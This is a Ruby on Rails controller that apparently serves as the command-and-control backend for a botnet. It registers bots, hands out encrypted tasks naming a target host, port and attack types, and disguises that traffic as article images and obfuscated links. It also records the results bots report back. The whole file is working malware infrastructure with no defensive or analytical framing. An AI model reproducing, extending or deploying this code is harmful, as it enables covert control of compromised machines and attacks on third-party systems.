# frozen_string_literal: true

module Api::V1
  class ClientControlController < ApplicationController
    include ::BotHelper
    include ::CryptHelper

    skip_before_action :authenticate_user_request
    skip_before_action :check_user_api_token
    before_action :authenticate_bot_request

    def routing
      content = nil
      payload = recover_payload

      case payload[:action]
      when 'ECHO'
        raise CustomError.new(message: "Bot Issue or Fake with id: #{current_bot.id}", fatal: true) if !current_bot.bot_status.valid_to_registered?

        current_bot.update(active: true, bot_status: BotStatus.operating)

      when 'GET_COMMANDS'
        raise CustomError.new(message: "The bot is not active with id: #{current_bot.id}", fatal: true) if !current_bot.active || !current_bot.bot_status.ready?

        settings = current_bot.bot_settings.only_active
        coms = command_pool
        if coms.present?
          payload = encrypt(coms.to_s, settings.crypt_config['key'], settings.crypt_config['iv'])

          content = {
            article: {
              image: payload[:ciphertext],
              url: ofuscate_image_link(payload[:tag], Parameter.client_c_uri.split('https://').last, Parameter.client_c_pool)
            }
          }
        end

      when 'REPORT_COMMANDS'
        puts "\n Result reported: #{payload}"
        bot_command = current_bot.bot_command_pools.find_by(id: payload[:result][:identifier])
        bot_command.update(result: payload[:result].except(:identifier))
      end

      success_output(content: content)

    rescue StandardError => e
      process_error(e)
    end

    private

    def bot_params
      params.permit(
        :name,
        :image,
        :url
      )
    end

    def recover_payload
      @bot_setting = current_bot.bot_settings.only_active

      recover_register_payload(
        bot_params[:image],
        bot_params[:url],
        Parameter.client_c_pool,
        @bot_setting.crypt_config['key'],
        @bot_setting.crypt_config['iv']
      ).with_indifferent_access
    end

    def command_pool
      @command = current_bot.bot_command_pools.pop_pending
      return nil if @command.blank?

      {
        id: @command.id,
        host_target: @command.metadata['host_target'],
        port: @command.metadata['port'],
        type: @command.metadata['type'],
        type_2: @command.metadata['type_2'],
        type_3: @command.metadata['type_3']
      }
    end
  end
end